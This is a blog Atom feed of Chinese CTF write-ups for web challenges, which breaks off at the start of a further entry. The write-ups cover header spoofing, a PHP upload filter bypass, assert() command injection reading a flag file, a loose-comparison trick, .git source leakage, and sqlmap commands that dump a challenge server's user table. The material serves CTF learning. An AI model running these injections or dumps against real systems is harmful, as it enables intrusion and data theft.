<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2019-12-09T01:50:24.249Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Bug</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Bug/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Bug/</id>
    <published>2019-12-09T01:18:21.000Z</published>
    <updated>2019-12-09T01:50:24.249Z</updated>
    
    <content type="html"><![CDATA[<p>给出一个登录页面;首先随便注册一个用户；<br><img src="https://s2.ax1x.com/2019/12/09/Qd5WsP.png" alt="Qd5WsP.png"><br> <img src="/images/bug01.png" alt="bug01.png"><br>登录；<br> <img src="/images/bug02.png" alt="bug02.png"><br>发现只有Manage是不能普通用户使用的；<br> <img src="/images/bug03.png" alt="bug03.png"><br>最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口；<br>先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份；<br> <img src="/images/bug04.png" alt="bug04.png"><br>修改为admin，提示修改成功；</p><p><img src="/images/bug05.png" alt="bug05.png"><br>以admin身份登录成功；<br>但是Manage还是不能使用提示IP not allowed!<br>应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面；<br> <img src="/images/bug07.png" alt="bug07.png"><br>查看源码，看到提示：<br> <img src="/images/bug08.png" alt="bug08.png"><br>看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)；<br>关于文件上传：<a href="https://blog.csdn.net/qq_42636435/article/details/88096844" target="_blank" rel="noopener">https://blog.csdn.net/qq_42636435/article/details/88096844</a><br> <img src="/images/bug09.png" alt="bug09.png"><br>根据提示Just image？因该是上传image然后改后缀；<br>构造： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line">    phpinfo();</span><br><span class="line">？&gt;</span><br></pre></td></tr></table></figure><p>上传发现，过滤了<?php?>;<br>不是php文件又不能进行解析得到响应；<br>非php文件下提示要上传php文件；<br>It is not a really php file<br>这里尝试使用php的脚本表达形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> <img src="/images/bug11.png" alt="bug11.png"><br>将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给出一个登录页面;首先随便注册一个用户；&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/09/Qd5WsP.png&quot; alt=&quot;Qd5WsP.png&quot;&gt;&lt;br&gt; &lt;img src=&quot;/images/bug01.png&quot; alt=&quot;bug0
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>NaNNaNNaNNaN-Batman</title>
    <link href="https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/"/>
    <id>https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/</id>
    <published>2019-12-09T01:08:23.000Z</published>
    <updated>2019-12-09T01:17:56.321Z</updated>
    
    <content type="html"><![CDATA[<p>NaNNaNNaNNaN-Batman<br>下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框；<br> <img src="/images/batman01.png" alt="batman01.png"><br>但是输入没有任何响应；回头再看看代码；<br> <img src="/images/batman03.png" alt="batman03.png"><br>可以很明显看到,’<em>’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval(</em>)函数执行_;<br>**<br>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>**<br>此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).<br>为了能看到正常源码，将eval()改为alert()；<br>**<br>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。<br>alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。<br>|alert(message)| |<br>|:——–:|:————-:|<br>|参数    |描述|<br>|message    |要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）|<br>**<br> <img src="/images/batman02.png" alt="batman02.png"><br>即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>**<br>match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。<br>splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)<br>**<br>方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa<br>在OK输入框中输入可以得到flag；<br>方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p><img src="/images/batman04.png" alt="batman04.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;NaNNaNNaNNaN-Batman&lt;br&gt;下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框；&lt;br&gt; &lt;img src=&quot;/images/batman01.png&quot; alt=&quot;batman01.png&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Training-WWW-Robots</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/</id>
    <published>2019-12-09T01:03:58.000Z</published>
    <updated>2019-12-09T01:07:21.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。<br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。<br>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。<br>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科)<br>访问robots.txt，发现不允许访问fl0g.php<br> <img src="/images/robots-02.png" alt="robots-02.png"><br>尝试访问/fl0g.php，得到flag；<br>  <img src="/images/robots-01.png" alt="robots-01.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Training-WWW-Robots&quot;&gt;&lt;a href=&quot;#Training-WWW-Robots&quot; class=&quot;headerlink&quot; title=&quot;Training-WWW-Robots&quot;&gt;&lt;/a&gt;Training-WWW-Robots&lt;/h1&gt;&lt;p&gt;ro
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Mfw</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Mfw/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Mfw/</id>
    <published>2019-12-09T00:58:05.000Z</published>
    <updated>2019-12-09T01:07:26.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mfw"><a href="#Mfw" class="headerlink" title="Mfw"></a>Mfw</h1><p>打开链接，几个目录都看了下，发现：<br> <img src="/images/mfw01.png" alt="mfw01.png"><br>可能存在git源码泄露，尝试访问.git目录：<br>  <img src="/images/mfw02.png" alt="mfw02.png"><br>利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)：<br>  <img src="/images/mfw03.png" alt="mfw03.png"><br>在GitHack目录下可以看到网站源码文件夹：<br>  <img src="/images/mfw04.png" alt="mfw04.png"><br>在flag.php中只有如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// $FLAG = '';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是将flag.php中的内容注释了，不显在网页上。<br>在index.php中发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**<br>assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;<br>/<em>PHP官方文档是怎么解释的：<br>    assert — 检查一个断言是否为 FALSE<br>    PHP 5<br>    bool assert ( mixed $assertion [, string $description ] )<br>    PHP 7<br>    bool assert ( mixed $assertion [, Throwable $exception ] )<br>    assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>    如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br>断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。<br>*/<br>die() 函数输出一条消息，并退出当前脚本；<br>strpos(string,find,start)查找find在字符串string中第一次出现的位置;<br>file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。<br>*</em><br>如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//<br>{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码；<br>  <img src="/images/mfw05.png" alt="mfw05.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Mfw&quot;&gt;&lt;a href=&quot;#Mfw&quot; class=&quot;headerlink&quot; title=&quot;Mfw&quot;&gt;&lt;/a&gt;Mfw&lt;/h1&gt;&lt;p&gt;打开链接，几个目录都看了下，发现：&lt;br&gt; &lt;img src=&quot;/images/mfw01.png&quot; alt=&quot;mfw01.png&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Lottery!</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Lottery/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Lottery/</id>
    <published>2019-12-09T00:49:07.000Z</published>
    <updated>2019-12-09T01:07:29.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lottery！"><a href="#Lottery！" class="headerlink" title="Lottery！"></a>Lottery！</h1><p>随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；<br><img src="/images/lottery01.png" alt="lottery01.png"><br>根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实，<br> <img src="/images/lottery02.png" alt="lottery02.png"><br>用burpsuite对输入彩票数字验证过程抓包，得到api.php;<br> <img src="/images/lottery03.png" alt="lottery03.png"><br>不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>尝试访问：<br> <img src="/images/lottery07.png" alt="lottery07.png"><br>可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)<br>打开之前下载好的源文件：<br> <img src="/images/lottery04.png" alt="lottery04.png"><br>打开api.php文件，可以看到以下验证彩票数字代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">    $same_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">            $same_count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ($same_count) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $prize = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            $prize = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            $prize = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            $prize = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            $prize = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            $prize = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $prize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；<br>改包：<br> <img src="/images/lottery05.png" alt="lottery05.png"><br>发现已经获得$200000;多提交几余额就够了，buy-&gt;flag；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lottery！&quot;&gt;&lt;a href=&quot;#Lottery！&quot; class=&quot;headerlink&quot; title=&quot;Lottery！&quot;&gt;&lt;/a&gt;Lottery！&lt;/h1&gt;&lt;p&gt;随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ics-04</title>
    <link href="https://singlemindedt.github.io/2019/12/09/ics-04/"/>
    <id>https://singlemindedt.github.io/2019/12/09/ics-04/</id>
    <published>2019-12-09T00:28:33.000Z</published>
    <updated>2019-12-09T01:07:33.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><p>本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”；<br> <img src="/images/ics04-1.png" alt="ics04-1.png"><br>尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞；<br>构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库<br>sqlmap -u “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” –dbs<br>得到库名结果；<br>  <img src="/images/ics04-2.png" alt="ics04-2.png"><br>库名<br>对每个数据库进行表名猜解；<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 –tables<br>  <img src="/images/ics04-5.png" alt="ics04-5.png"><br>对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user –columns<br>  <img src="/images/ics04-6.png" alt="ics04-6.png"><br>对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user -C “username,password” –dump<br>  <img src="/images/ics04-7.png" alt="ics04-7.png"><br>由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag；<br>  <img src="/images/ics04-3.png" alt="ics04-3.png"><br>此时对username查询可得到两条结果；<br>  <img src="/images/ics04-8.png" alt="ics04-8.png"><br>第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；<br>注：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\Python27\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；<br>关于sqlmap使用：<a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">https://blog.csdn.net/qq_33530840/article/details/82144515</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ics-04&quot;&gt;&lt;a href=&quot;#ics-04&quot; class=&quot;headerlink&quot; title=&quot;ics-04&quot;&gt;&lt;/a&gt;ics-04&lt;/h1&gt;&lt;p&gt;本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs环境搭建</title>
    <link href="https://singlemindedt.github.io/2019/12/02/sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://singlemindedt.github.io/2019/12/02/sqli-labs环境搭建/</id>
    <published>2019-12-02T02:01:08.000Z</published>
    <updated>2019-12-02T02:25:49.391Z</updated>
    
    <content type="html"><![CDATA[<p>##1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)；</p><p>##2.下载sqli-labs文件，Github下载解压至Phpstudy2018\PHPTutorial\WWW目录下；</p><p>##3.更改数据库密码，E:\PhpStudy2018\PHPTutorial\WWW\sqli-labs-master\sqli-labs-master\sql-connections\db-creds,自己任意设置；</p><p>##4.开启Phpstudy2018的Apache和MySql服务;</p><p>##5.基本配置完成，打开<a href="http://127.0.0.1/sqli-labs-master/，若出现如下页面则搭建成功；" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/，若出现如下页面则搭建成功；</a><br><img src="/images/sql0.png" alt="sql0"></p><p>##6.点击Setup/reset Database for labs建立数据库连接，若出现如下页面则搭建完成；<br><img src="/images/sql1.png" alt="sql1"></p><p>##7.访问<a href="http://127.0.0.1/sqli-labs-master/" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/</a> 时，若出现<strong>You don’t have permission to access /sqli-labs-master/ on this server.</strong>；则打开Phpstudy2018的“其他选项菜单\打开配置文件\httpd.conf”;配置为如下情况；<br><img src="/images/sql2.png" alt="sql2">；同时将“phpstudy设置”设置为“允许目录列表”；<br>至此，sqli-labs环境搭建完成！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)；&lt;/p&gt;
&lt;p&gt;##2.下载sqli-labs文件，Github下载解压至Phpstudy2018\PHPTutorial\WWW目录下；&lt;/p&gt;
&lt;p&gt;##3.更改
      
    
    </summary>
    
      <category term="SQL" scheme="https://singlemindedt.github.io/categories/SQL/"/>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>凯撒密码</title>
    <link href="https://singlemindedt.github.io/2019/11/16/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"/>
    <id>https://singlemindedt.github.io/2019/11/16/凯撒密码/</id>
    <published>2019-11-16T14:18:05.000Z</published>
    <updated>2019-12-09T00:08:38.858Z</updated>
    
